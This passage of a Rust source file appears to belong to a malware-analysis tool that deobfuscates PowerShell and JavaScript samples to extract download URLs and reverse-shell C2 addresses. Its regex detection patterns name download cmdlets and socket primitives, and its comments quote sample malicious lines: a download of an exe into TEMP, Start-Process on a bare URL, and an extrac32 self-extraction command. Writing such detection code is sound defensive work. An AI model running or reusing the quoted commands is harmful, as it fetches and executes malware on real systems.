        let gap = &deobfuscated[prev_end..outer.start()];
        let chain_continues = gap
            .as_bytes()
            .iter()
            .all(|b| b.is_ascii_whitespace() || *b == b'+');
        if !chain_continues {
            try_extract_url_from_buf(&buf, &known, &mut seen, env);
            buf.clear();
        }
        for tok in nums.as_str().split(',') {
            let tok = tok.trim();
            if let Ok(n) = tok.parse::<u32>() {
                if n < 256 {
                    buf.push((n as u8) as char);
                }
            }
        }
        prev_end = outer.end();
    }
    try_extract_url_from_buf(&buf, &known, &mut seen, env);
}

fn try_extract_url_from_buf(
    buf: &str,
    known: &std::collections::HashSet<String>,
    seen: &mut std::collections::HashSet<String>,
    env: &mut Environment,
) {
    if buf.is_empty() {
        return;
    }
    // The decoded chain often is `http://host/path` directly.
    if let Some(idx) = buf
        .find("http://")
        .or_else(|| buf.find("https://"))
        .or_else(|| buf.find("ftp://"))
    {
        let tail = &buf[idx..];
        let end = tail
            .as_bytes()
            .iter()
            .position(|b| b.is_ascii_whitespace() || matches!(b, b'"' | b'\'' | b'<' | b'>'))
            .unwrap_or(tail.len());
        let url = trim_url_suffix(&tail[..end]);
        if url.len() < 10 || url.len() > 2048 {
            return;
        }
        if is_noise_ip(url) {
            return;
        }
        if known.contains(url) || !seen.insert(url.to_string()) {
            return;
        }
        env.traits.push(Trait::DownloadInDeobText {
            src: url.to_string(),
            line_hint: "ps-char-concat".to_string(),
        });
    }
}

/// PowerShell `.Replace('xyz', 'abc')` URL deobfuscation. The `as.ps1` /
/// `zp.ps1` / `mx.ps1` / `zk.ps1` / `eua.ps1` family hides URLs by
/// peppering them with a 2-3 char marker (`eq0`, `ibl`, `dgu`, `mo4`,
/// `fwz`) and applies `.Replace(marker, 'e')` / `.Replace('quwd', 'tps://')`
/// at runtime. We mirror that statically: collect every `(needle,
/// replacement)` pair the body declares, then apply them to every quoted
/// string that *looks like an obfuscated URL template* (starts with `ht`
/// or contains `quwd`/`htxp`) and emit the result if it's a real URL.
pub fn scan_ps_replace_chain_urls(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    // Collect every `.Replace('A', 'B')` (and `-replace 'A', 'B'`) pair.
    let pairs = crate::aes_chain::ps_extract::find_replace_chain(deobfuscated);
    if pairs.is_empty() {
        return;
    }
    // Candidate strings: quoted literals whose head looks like an
    // obfuscated URL scheme (`ht…`, `quwd`, `htxp`) or already contains a
    // scheme but with extra marker garbage. Cap length to keep regex
    // backtracking bounded.
    static URL_TEMPLATE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"['"]((?:ht|quwd|htxp|hxxp)[A-Za-z0-9._/\\?&=:%~+\-]{8,400})['"]"#)
            .expect("url template re")
    });
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in URL_TEMPLATE_RE.captures_iter(deobfuscated) {
        let Some(m) = caps.get(1) else { continue };
        let mut s = m.as_str().to_string();
        // Apply every pair longest-needle-first so substring noise like
        // `quwd` is collapsed before `e`-style replacements compound it.
        let mut ordered = pairs.clone();
        ordered.sort_by_key(|(n, _)| std::cmp::Reverse(n.len()));
        for (needle, replacement) in &ordered {
            if needle.is_empty() {
                continue;
            }
            s = s.replace(needle.as_str(), replacement.as_str());
        }
        if !(starts_with_ascii_case_insensitive(&s, "http://")
            || starts_with_ascii_case_insensitive(&s, "https://")
            || starts_with_ascii_case_insensitive(&s, "ftp://")
            || starts_with_ascii_case_insensitive(&s, "file://"))
        {
            continue;
        }
        let s = trim_url_suffix(&s);
        if s.len() < 10 || is_noise_url(s) {
            continue;
        }
        if known.contains(s) || !seen.insert(s.to_string()) {
            continue;
        }
        env.traits.push(Trait::DownloadInDeobText {
            src: s.to_string(),
            line_hint: "ps-replace-chain-deob".to_string(),
        });
    }
}

/// PowerShell char-index-extractor deobfuscation. Family pattern
/// (Musculos / 订单列表.bat style — 30+ corpus samples):
///
///   function Musculos ($filmprod,…){
///       $overill=3;
///       do { $sirp+=$filmprod[$overill]; $overill+=4; … }
///       until (!$filmprod[$overill]) $sirp
///   }
///   $u = Musculos 'a.ahaaataaataaapaaasaaa:aaa…'
///   # ↓ extracts chars at positions 3, 7, 11, 15, … → 'https://…'
///
/// We detect the function definition's `$idx=START; do{ …$arg[$idx];
/// $idx+=STEP }`, then for every call site `NAME 'literal'` we extract
/// chars at indices START, START+STEP, START+2*STEP, … and run URL_RE
/// on the result. Any URLs we surface as `DownloadInDeobText`.
pub fn scan_ps_char_index_extractor_urls(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    // Two-pass detection because the `regex` crate lacks backreferences:
    //   (1) Find `function NAME(...){...}` blocks (header capture only).
    //   (2) Inside each block, find any `$IDX=START` / `$IDX+=STEP`
    //       pair where IDX is the same identifier. Verify `[$IDX]` is
    //       referenced as an array index too.
    static FN_BLOCK_RE: Lazy<Regex> = Lazy::new(|| {
        // Permissive body — real samples intersperse Compare-Object
        // decoys; the body matching tolerates them. `[^}]{50,2000}` is
        // a soft cap to avoid pathological cases.
        Regex::new(r#"(?is)function\s+(\w+)\s*\(\s*\$\w+[^)]*\)\s*\{([^}]{50,2000})\}"#)
            .expect("ps char-idx fn block re")
    });
    static IDX_INIT_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"(?i)\$(\w+)\s*=\s*(\d{1,3})\s*;"#).expect("idx init re"));
    static IDX_STEP_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"(?i)\$(\w+)\s*\+\s*=\s*(\d{1,3})"#).expect("idx step re"));
    static IDX_USE_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"(?i)\[\s*\$(\w+)\s*\]"#).expect("idx use re"));
    let mut extractors: Vec<(String, usize, usize)> = Vec::new();
    for caps in FN_BLOCK_RE.captures_iter(deobfuscated) {
        let (Some(name), Some(body)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let body = body.as_str();
        // Build {ident → start} from $IDX=N pattern.
        let mut starts: std::collections::HashMap<String, usize> = std::collections::HashMap::new();
        for ic in IDX_INIT_RE.captures_iter(body) {
            if let (Some(v), Some(n)) = (ic.get(1), ic.get(2)) {
                if let Ok(start) = n.as_str().parse::<usize>() {
                    if start < 256 {
                        starts.entry(v.as_str().to_string()).or_insert(start);
                    }
                }
            }
        }
        // Same for steps.
        let mut steps: std::collections::HashMap<String, usize> = std::collections::HashMap::new();
        for sc in IDX_STEP_RE.captures_iter(body) {
            if let (Some(v), Some(n)) = (sc.get(1), sc.get(2)) {
                if let Ok(step) = n.as_str().parse::<usize>() {
                    if (1..=64).contains(&step) {
                        steps.entry(v.as_str().to_string()).or_insert(step);
                    }
                }
            }
        }
        // Indices actually used as array subscripts.
        let mut used: std::collections::HashSet<String> = std::collections::HashSet::new();
        for uc in IDX_USE_RE.captures_iter(body) {
            if let Some(v) = uc.get(1) {
                used.insert(v.as_str().to_string());
            }
        }
        // Pick the index that has init AND step AND is used as `[$idx]`.
        for (var, start) in &starts {
            if let Some(step) = steps.get(var) {
                if used.contains(var) {
                    extractors.push((name.as_str().to_string(), *start, *step));
                    break;
                }
            }
        }
        if extractors.len() >= 8 {
            break;
        }
    }
    if extractors.is_empty() {
        return;
    }
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for (name, start, step) in &extractors {
        // Match every call site: `Musculos 'literal'` or `Musculos "literal"`.
        // The regex is built dynamically since the name varies per sample.
        let pattern = format!(
            r#"(?i)\b{}\s+['"]([^'"]{{16,8000}})['"]"#,
            regex::escape(name)
        );
        let Ok(call_re) = Regex::new(&pattern) else {
            continue;
        };
        let mut extracted_strings = Vec::new();
        let mut extracted_urls = Vec::new();
        for call_caps in call_re.captures_iter(deobfuscated).take(64) {
            let Some(arg) = call_caps.get(1) else {
                continue;
            };
            let arg_str = arg.as_str();
            let mut extracted = String::with_capacity(arg_str.len() / step + 1);
            if arg_str.is_ascii() {
                let bytes = arg_str.as_bytes();
                let mut idx = *start;
                while idx < bytes.len() {
                    extracted.push(bytes[idx] as char);
                    idx += step;
                }
            } else {
                let chars: Vec<char> = arg_str.chars().collect();
                let mut idx = *start;
                while idx < chars.len() {
                    extracted.push(chars[idx]);
                    idx += step;
                }
            }
            if extracted.len() < 8 {
                continue;
            }
            extracted_strings.push(extracted.clone());
            // Look for URLs in the extracted string.
            for url_caps in URL_RE.captures_iter(&extracted) {
                let Some(m) = url_caps.get(1) else { continue };
                let url = trim_url_suffix(m.as_str());
                if url.len() < 8 || is_noise_url(url) {
                    continue;
                }
                if known.contains(url) || !seen.insert(url.to_string()) {
                    continue;
                }
                extracted_urls.push(url.to_string());
            }
        }
        if extracted_urls.is_empty() {
            continue;
        }
        let has_download_context = extracted_strings.iter().any(|s| {
            let lower = s.to_ascii_lowercase();
            lower.contains("downloadfile")
                || lower.contains("downloadstring")
                || lower.contains("invoke-webrequest")
                || lower.contains("invoke-restmethod")
                || lower.contains("start-bitstransfer")
        });
        for url in extracted_urls {
            let cmd = format!(
                "ps-char-index-extractor (fn={}, start={}, step={})",
                name, start, step
            );
            if has_download_context {
                env.traits.push(Trait::Download {
                    cmd,
                    src: url,
                    dst: None,
                });
            } else {
                env.traits.push(Trait::DownloadInDeobText {
                    src: url,
                    line_hint: cmd,
                });
            }
        }
    }
}

/// PowerShell socket-style reverse shells store the C2 address as
/// SEPARATE `$ipaddress = '<ip>'` and `$dport = <port>` literals at
/// the top, then later invoke `New-Object Net.Sockets.TcpClient($ip,
/// $port)` with variable args. The TcpClient regex in
/// `scan_remote_connects` can't capture those (the constructor only
/// sees the variable names), so the C2 IP+port pair leaks. This
/// scanner connects the dots: when the script defines a single
/// public-IPv4 literal AND a single port literal AND uses
/// TcpClient/Socket/WebClient anywhere, emit `RemoteConnect{ip,port}`.
/// One pair only — multi-IP scripts (load balancers, ranges) would
/// risk pairing the wrong values and aren't C2-typical anyway.
pub fn scan_ps_var_socket_connect(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    // Need socket / network primitive usage somewhere in the script
    // for this pair to make sense as a C2 indicator.
    static SOCKET_USE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?i)(?:New-Object\s+(?:System\.)?Net\.Sockets|TcpClient|UdpClient|\.Connect\(|WebClient|HttpWebRequest)"#,
        )
        .expect("socket use re")
    });
    if !SOCKET_USE_RE.is_match(deobfuscated) {
        return;
    }
    // Collect `$var = 'IP'` and `$var = PORT`. We want literal-string
    // OR bare-int RHS — don't fire on expressions.
    static IP_VAR_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\$\w+\s*=\s*['"](\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})['"]"#)
            .expect("ip var re")
    });
    static PORT_VAR_RE: Lazy<Regex> = Lazy::new(|| {
        // Match `$port = 443`, `$dport = 443`, etc. Var name must hint
        // at port semantics to avoid pairing a stray integer literal
        // (random counters, sleep durations) with the IP.
        Regex::new(r#"(?i)\$\w*(?:port|prt)\w*\s*=\s*(\d{1,5})\b"#).expect("port var re")
    });
    // Public-IPv4 filter (excluding RFC1918, loopback, link-local, 0.0.0.0).
    fn is_public_v4(ip: &str) -> bool {
        let parts: Vec<u8> = ip.split('.').filter_map(|p| p.parse().ok()).collect();
        if parts.len() != 4 {
            return false;
        }
        let (a, b) = (parts[0], parts[1]);
        if a == 0 || a == 127 || a == 10 {
            return false;
        }
        if a == 172 && (16..=31).contains(&b) {
            return false;
        }
        if a == 192 && b == 168 {
            return false;
        }
        if a == 169 && b == 254 {
            return false;
        }
        true
    }
    // Find every public-IP var-assignment and pair it with the
    // nearest port-var-assignment within 256 chars (forward OR
    // backward — adjacency order varies). That handles multi-port
    // scripts (buffer-size literals named `$newport` etc. won't be
    // the closest one to the IP).
    let ip_hits: Vec<(usize, String)> = IP_VAR_RE
        .captures_iter(deobfuscated)
        .filter_map(|c| {
            let m = c.get(1)?;
            let ip = m.as_str().to_string();
            if !is_public_v4(&ip) {
                return None;
            }
            Some((m.start(), ip))
        })
        .collect();
    let port_hits: Vec<(usize, u16)> = PORT_VAR_RE
        .captures_iter(deobfuscated)
        .filter_map(|c| {
            let m = c.get(1)?;
            let p: u16 = m.as_str().parse().ok()?;
            if p == 0 || p == 256 || p == 1024 || p == 2048 || p == 4096 {
                // Drop power-of-2 buffer-size lookalikes; real C2 ports
                // rarely land on these.
                return None;
            }
            Some((m.start(), p))
        })
        .collect();
    if ip_hits.is_empty() || port_hits.is_empty() {
        return;
    }
    // Dedup the pairs we'd emit so multi-IP or multi-port scripts
    // don't fan out — at most one RemoteConnect per (ip, port).
    let mut emitted: std::collections::HashSet<(String, u16)> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            crate::traits::Trait::RemoteConnect { host, port, .. } => Some((host.clone(), *port)),
            _ => None,
        })
        .collect();
    for (ip_pos, ip) in &ip_hits {
        let Some((_, port)) = port_hits
            .iter()
            .min_by_key(|(p_pos, _)| (*p_pos as isize - *ip_pos as isize).unsigned_abs())
        else {
            continue;
        };
        // Only count pairs within 256 chars — beyond that it's
        // unlikely they belong together.
        let port_pos = port_hits
            .iter()
            .find(|(_, p)| p == port)
            .map(|(pos, _)| *pos)
            .unwrap_or(*ip_pos);
        if port_pos.abs_diff(*ip_pos) > 256 {
            continue;
        }
        let pair = (ip.clone(), *port);
        if !emitted.insert(pair.clone()) {
            continue;
        }
        env.traits.push(crate::traits::Trait::RemoteConnect {
            cmd: format!("$ipaddress = '{ip}'; $port = {port}; … TcpClient($ip, $port)"),
            host: pair.0,
            port: pair.1,
        });
    }
}

/// Detect `extrac32 /Y "src" "dst"` self-extraction patterns in the
/// deobfuscated text and emit `Trait::Extrac32` + `Trait::SelfExtract`.
/// The dispatcher already emits these for batch scripts that reach
/// `interp::interpret_line`, but the bat/CAB dual-detonation pattern
/// (15 corpus samples) hides the `extrac32 /y "%~f0" "%tmp%\x.exe"`
/// line inside a CAB header — input never goes through `drive()` so
/// the handler never fires. Running this scanner over the printable-
/// ASCII runs that `scan_binary_input_urls` carves out of the CAB
/// head catches it.
pub fn scan_extrac32_self_extract(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static EXTRAC32_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?ix)
                \b extrac32 (?:\.exe)? \b
                (?: \s+ /[a-z] )*           # flags like /y /e /a /c
                \s+ ["']? ([^"'\s]+) ["']?  # src
                \s+ ["']? ([^"'\s]+) ["']?  # dst
            "#,
        )
        .expect("extrac32 re")
    });
    for caps in EXTRAC32_RE.captures_iter(deobfuscated) {
        let (Some(src), Some(dst)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let src_s = src.as_str().to_string();
        let dst_s = dst.as_str().to_string();
        let self_reference = src_s.contains("%~f0")
            || src_s.contains("%~F0")
            || src_s.contains("%0")
            || src_s.contains("script.bat");
        let already = env.traits.iter().any(|t| {
            matches!(
                t,
                crate::traits::Trait::Extrac32 { src, dst, .. } if src == &src_s && dst == &dst_s
            )
        });
        if already {
            continue;
        }
        env.traits.push(crate::traits::Trait::Extrac32 {
            src: src_s,
            dst: dst_s,
            self_reference,
        });
        if self_reference {
            // Use the existing SelfExtract variant so analyst tooling
            // already keyed off it (PE/CAB self-extracts) sees this
            // bat/CAB dual-detonation pattern too.
            let has_self_extract = env
                .traits
                .iter()
                .any(|t| matches!(t, crate::traits::Trait::SelfExtract { .. }));
            if !has_self_extract {
                env.traits.push(crate::traits::Trait::SelfExtract {
                    method: "extrac32-self-cab".to_string(),
                });
            }
        }
    }
}

/// JavaScript `unescape('%3C%21DOCTYPE…')` / `decodeURIComponent(...)`
/// URL-encoded blob decoder. 8 corpus .js samples wrap their HTA/JS
/// payload (which often hosts `https://gov-cn.cloud/01Gni`-style C2
/// URLs in inline `targets = [...]` arrays) inside a single
/// `unescape('%XX%XX…')` literal. The bare bytes after decoding are
/// HTML/JS text; URL_RE picks any URLs straight out.
pub fn scan_js_unescape_urls(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    // Unbounded upper limit on the captured arg: Rust's regex DFA
    // size is exponential in the explicit upper bound, and
    // `{12,16384}` blows past the 10 MB cap. Cap the lex run via the
    // text limit instead — `URL_RE.captures_iter` is bounded by the
    // post-decode `min(16 KB)`, and length sanity-checks below skip
    // anything absurd.
    static UNESCAPE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\b(?:unescape|decodeURIComponent)\s*\(\s*['"]([^'"]+)['"]\s*\)"#)
            .expect("js unescape re")
    });
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in UNESCAPE_RE.captures_iter(deobfuscated) {
        let Some(m) = caps.get(1) else { continue };
        let encoded = m.as_str();
        // %XX → byte. Anything else passes through. Mirrors JS's
        // `unescape()` semantics: also handles `%uXXXX` for UTF-16
        // codepoints (rare in our corpus but trivial to support).
        let decoded = js_unescape(encoded);
        if decoded.len() < 8 {
            continue;
        }
        // Bounded scan: 16 KB is plenty for the largest unescape blob
        // in the corpus and keeps URL_RE's worst case predictable.
        let scan = &decoded[..floor_char_boundary(&decoded, 16 * 1024)];
        for url_caps in URL_RE.captures_iter(scan) {
            let Some(url_m) = url_caps.get(1) else {
                continue;
            };
            let url = trim_url_suffix(url_m.as_str());
            if url.len() < 8 || is_noise_url(url) {
                continue;
            }
            if known.contains(url) || !seen.insert(url.to_string()) {
                continue;
            }
            env.traits.push(Trait::DownloadInDeobText {
                src: url.to_string(),
                line_hint: "js-unescape".to_string(),
            });
        }
    }
}

/// Mirror JavaScript's `unescape()` / `decodeURIComponent()` —
/// `%XX` → byte (interpreted as UTF-8 string), `%uXXXX` → UTF-16
/// codepoint. Invalid escapes pass through literally.
fn js_unescape(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out_bytes: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            // `%uXXXX` — 4 hex digits, UTF-16 codepoint.
            if (bytes[i + 1] == b'u' || bytes[i + 1] == b'U') && i + 5 < bytes.len() {
                let hex = std::str::from_utf8(&bytes[i + 2..i + 6]).unwrap_or("");
                if let Ok(cp) = u32::from_str_radix(hex, 16) {
                    if let Some(c) = char::from_u32(cp) {
                        let mut buf = [0u8; 4];
                        out_bytes.extend_from_slice(c.encode_utf8(&mut buf).as_bytes());
                        i += 6;
                        continue;
                    }
                }
            }
            // `%XX` — 2 hex digits, byte.
            let hex = std::str::from_utf8(&bytes[i + 1..i + 3]).unwrap_or("");
            if let Ok(b) = u8::from_str_radix(hex, 16) {
                out_bytes.push(b);
                i += 3;
                continue;
            }
        }
        out_bytes.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out_bytes).into_owned()
}

/// JavaScript `atob('...')` URL deobfuscation for raw deob text. Extracted
/// JScript payloads go through `js_scan`; this catches inline/eval JS snippets
/// that are visible in the deob output but not queued as separate JScript.
pub fn scan_js_atob_urls(deobfuscated: &str, env: &mut Environment) {
    use base64::Engine;
    use once_cell::sync::Lazy;
    use regex::Regex;

    static ATOB_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)(?:^|[^A-Za-z0-9_$])atob\s*\(\s*['"]([A-Za-z0-9+/=\s]+)['"]\s*\)"#)
            .expect("js atob re")
    });

    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in ATOB_RE.captures_iter(deobfuscated) {
        let Some(m) = caps.get(1) else { continue };
        let encoded = m.as_str();
        if encoded.len() < 12 || encoded.len() > 16 * 1024 {
            continue;
        }
        let bytes = encoded.as_bytes();
        let cleaned = if bytes.iter().any(|b| b.is_ascii_whitespace()) {
            std::borrow::Cow::Owned(
                bytes
                    .iter()
                    .copied()
                    .filter(|b| !b.is_ascii_whitespace())
                    .collect::<Vec<u8>>(),
            )
        } else {
            std::borrow::Cow::Borrowed(bytes)
        };
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(&cleaned) else {
            continue;
        };
        if decoded.len() < 8 || decoded.len() > 16 * 1024 {
            continue;
        }
        let decoded = String::from_utf8_lossy(&decoded);
        for url_caps in URL_RE.captures_iter(&decoded) {
            let Some(url_m) = url_caps.get(1) else {
                continue;
            };
            let url = trim_url_suffix(url_m.as_str());
            if url.len() < 8 || is_noise_url(url) {
                continue;
            }
            if known.contains(url) || !seen.insert(url.to_string()) {
                continue;
            }
            env.traits.push(Trait::DownloadInDeobText {
                src: url.to_string(),
                line_hint: "js-atob".to_string(),
            });
        }
    }
}

/// JavaScript `String.fromCharCode(78,69,84,…)` URL deobfuscation.
/// 330 corpus .js samples use this; the eszja_1.3.41.js family
/// encodes `https://nav.domains/fall_back` as a sequence of ASCII
/// codepoints. We decode each fromCharCode list and run URL_RE on
/// the result. Multi-list concatenation (`String.fromCharCode(…) +
/// String.fromCharCode(…)`) is handled by also concatenating
/// *consecutive* decodes from the same scan.
pub fn scan_js_fromcharcode_urls(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    // Captures a sequence of `\d+(,\s*\d+)+` inside fromCharCode(…).
    // Minimum 5 nums so we don't over-match `fromCharCode(0x41)`-style
    // single-char calls (those are too short to carry an http URL).
    static FCC_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?i)\bString\s*(?:\.\s*fromCharCode|\[\s*["']fromCharCode["']\s*\])\s*\(\s*([0-9a-fx\s,]+)\)"#,
        )
        .expect("from char code re")
    });
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    // Track positions of consecutive calls so we can concat-decode
    // `String.fromCharCode(…) + String.fromCharCode(…)` chains.
    let matches: Vec<_> = FCC_RE.captures_iter(deobfuscated).collect();
    let mut decoded_chunks: Vec<(usize, usize, String)> = Vec::with_capacity(matches.len());
    for caps in &matches {
        let Some(m_arg) = caps.get(1) else { continue };
        let mut decoded = String::with_capacity(m_arg.as_str().len() / 3);
        for num in m_arg.as_str().split(',') {
            let num = num.trim();
            if num.is_empty() {
                continue;
            }
            let Some(n) = parse_js_charcode_number(num) else {
                continue;
            };
            if let Some(c) = char::from_u32(n) {
                if !c.is_control() || c == '\n' || c == '\t' {
                    decoded.push(c);
                }
            }
        }
        if decoded.len() < 5 {
            continue;
        }
        let Some(whole) = caps.get(0) else { continue };
        decoded_chunks.push((whole.start(), whole.end(), decoded));
    }
    // Concatenate adjacent chunks (`A + B` with `+` between them) and
    // also try each chunk alone. Up to 16 KB of concat to keep URL_RE
    // bounded.
    let mut to_scan: Vec<String> = Vec::with_capacity(decoded_chunks.len() * 2);
    for (i, (_, _, dec)) in decoded_chunks.iter().enumerate() {
        to_scan.push(dec.clone());
        // Build the run of adjacent chunks (separated only by whitespace
        // or `+`).
        let mut run = dec.clone();
        let mut last_end = decoded_chunks[i].1;
        for (start, end, next_dec) in &decoded_chunks[i + 1..] {
            let between = &deobfuscated[last_end..*start];
            if between
                .trim_matches(|c: char| c.is_whitespace() || c == '+')
                .is_empty()
            {
                run.push_str(next_dec);
                last_end = *end;
                if run.len() > 16 * 1024 {
                    break;
                }
            } else {
                break;
            }
        }
        if run.len() > dec.len() {
            to_scan.push(run);
        }
    }
    for chunk in &to_scan {
        for url_caps in URL_RE.captures_iter(chunk) {
            let Some(m) = url_caps.get(1) else { continue };
            let url = trim_url_suffix(m.as_str());
            if url.len() < 8 || is_noise_url(url) {
                continue;
            }
            if known.contains(url) || !seen.insert(url.to_string()) {
                continue;
            }
            env.traits.push(Trait::DownloadInDeobText {
                src: url.to_string(),
                line_hint: "js-fromcharcode".to_string(),
            });
        }
    }
}

fn parse_js_charcode_number(num: &str) -> Option<u32> {
    let num = num.trim();
    if num.is_empty() {
        return None;
    }
    if let Some(hex) = num.strip_prefix("0x").or_else(|| num.strip_prefix("0X")) {
        u32::from_str_radix(hex, 16).ok()
    } else {
        num.parse().ok()
    }
}

/// PowerShell + WScript samples often pass a *scheme-less* URL to
/// `Start-Process` / `iwr` / `irm` / `Invoke-WebRequest` /
/// `Invoke-RestMethod`. Windows' .NET WebClient and ShellExecute treat
/// `host.tld/path` as an `http://host.tld/path` URI when the protocol
/// handler can't resolve it as a file path. Common corpus shape:
///
///   iwr -Uri 'rebrand.ly/47i82k6' -OutFile $env:TEMP\f.exe
///   Start-Process 'goingupdate.com/ptoleqco'
///
/// URL_RE skips these because it anchors on `https?://`. We synthesize
/// the `http://` prefix and emit as `DownloadInDeobText` so analyst
/// tooling treats them like any other download.
pub fn scan_ps_bare_url_downloads(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    // Strict allowlist of TLDs we trust — broad enough to cover the
    // corpus's actual hits (rebrand.ly, goingupdate.com, 31yc.com,
    // backupitfirst.com) without firing on `Wscript.Shell`,
    // `Script.Shell`, `New-Object Net.WebClient` etc.
    static PS_BARE_URL_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?ix)
                \b (?: Start-Process | saps | iwr | irm
                     | Invoke-WebRequest | Invoke-RestMethod ) \b
                \s+ (?:-(?:Uri|FilePath|Path)\s+)?
                ['"]
                (
                    (?:[a-z0-9\-]+\.){1,4}
                    (?:com|net|org|io|ru|cn|me|info|biz|us|co|ly|gg|tk|xyz
                     |top|life|store|app|tools|rocks|click|stream|host|website
                     |pw|dev|sh|space|site|live|cloud|online|tech|art|news|pro|cc|to)
                    (?:/[^\s'"<>]{0,200})?
                )
                ['"]
            "#,
        )
        .expect("ps bare url re")
    });
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in PS_BARE_URL_RE.captures_iter(deobfuscated) {
        let Some(m) = caps.get(1) else { continue };
        let host_path = trim_url_suffix(m.as_str());
        if host_path.len() < 6 {
            continue;
        }
        let url = format!("http://{host_path}");
        if is_noise_url(&url) {
            continue;
        }
        if known.contains(&url) || !seen.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::DownloadInDeobText {
            src: url,
            line_hint: "ps-bare-url-download".to_string(),
        });
    }
}

pub fn scan_inline_b64_urls(deobfuscated: &str, env: &mut Environment) {
    use base64::Engine;
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut seen_b64: std::collections::HashSet<&str> = std::collections::HashSet::new();
    for caps in B64_INLINE_RE.captures_iter(deobfuscated) {
        let b64 = match caps.get(1) {
            Some(m) => m.as_str(),
            None => continue,
        };
        if !seen_b64.insert(b64) {
            continue;
        }
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
            continue;
        };
        // Decoded blob can be either:
        //   (a) the URL itself (rare; older `[byte[]]$u=[Convert]::From…(URL_B64)` form)
        //   (b) a PS one-liner with one or more URLs embedded (Data.ps1 /
        //       Datanew.ps1 / yenisc2.ps1 / stub.ps1 family — the whole
        //       script is a single FromBase64String wrapped in `iex`).
        // Decode UTF-8 first; fall back to lossy so a stray binary tail
        // doesn't sink an otherwise-readable PS payload.
        let text = match String::from_utf8(decoded) {
            Ok(s) => s,
            Err(e) => String::from_utf8_lossy(&e.into_bytes()).into_owned(),
        };
        let trimmed = text.trim();
        // (a) bare-URL fast path — preserves prior behaviour.
        if (trimmed.starts_with("http://")
            || trimmed.starts_with("https://")
            || trimmed.starts_with("ftp://"))
            && trimmed.len() <= 2048
            && trimmed.as_bytes().iter().all(|b| !b.is_ascii_control())
        {
            if known.contains(trimmed) {
                continue;
            }
            let url = trimmed.to_string();
            if seen.insert(url.clone()) {
                env.traits.push(Trait::DownloadInDeobText {
                    src: url,
                    line_hint: "FromBase64String inline".to_string(),
                });
            }
            continue;
        }
        // (b) PS-body sweep — extract every URL the decoded text contains.
        // Bounded: only the first few KB of decoded text are scanned to
        // keep the regex's worst case predictable on a maxed-out 8000-char
        // b64 input.
        let scan = &text[..floor_char_boundary(&text, 8192)];
        for c2 in URL_RE.captures_iter(scan) {
            let Some(m) = c2.get(1) else { continue };
            let url = trim_url_suffix(m.as_str());
            if url.len() < 8 || is_noise_url(url) {
                continue;
            }
            if known.contains(url) || !seen.insert(url.to_string()) {
                continue;
            }
            env.traits.push(Trait::DownloadInDeobText {
                src: url.to_string(),
                line_hint: "FromBase64String inline (decoded PS body)".to_string(),
            });
        }
    }
}

#[allow(clippy::expect_used)]
static QUOTED_B64_RE: Lazy<Regex> = Lazy::new(|| {
    // Single OR double quoted base64 string ≥60 chars
    Regex::new(r#"['"]([A-Za-z0-9+/]{60,1500}={0,2})['"]"#).expect("quoted b64")
});

pub fn scan_bare_b64_urls(deobfuscated: &str, env: &mut Environment) {
    use base64::Engine;
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut seen_b64: std::collections::HashSet<&str> = std::collections::HashSet::new();
    for caps in QUOTED_B64_RE.captures_iter(deobfuscated) {
        let Some(b64_m) = caps.get(1) else { continue };
        let b64 = b64_m.as_str();
        if !seen_b64.insert(b64) {
            continue;
        }
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
            continue;
        };
        // Try UTF-8 first
        let text = match String::from_utf8(decoded) {
            Ok(s) => s,
            Err(e) => {
                // Fallback: pure ASCII bytes-as-chars
                let decoded = e.into_bytes();
                let s: String = decoded
                    .iter()
                    .filter(|b| b.is_ascii())
                    .map(|b| *b as char)
                    .collect();
                if s.len() < decoded.len() {
                    continue;
                } // had non-ASCII
                s
            }
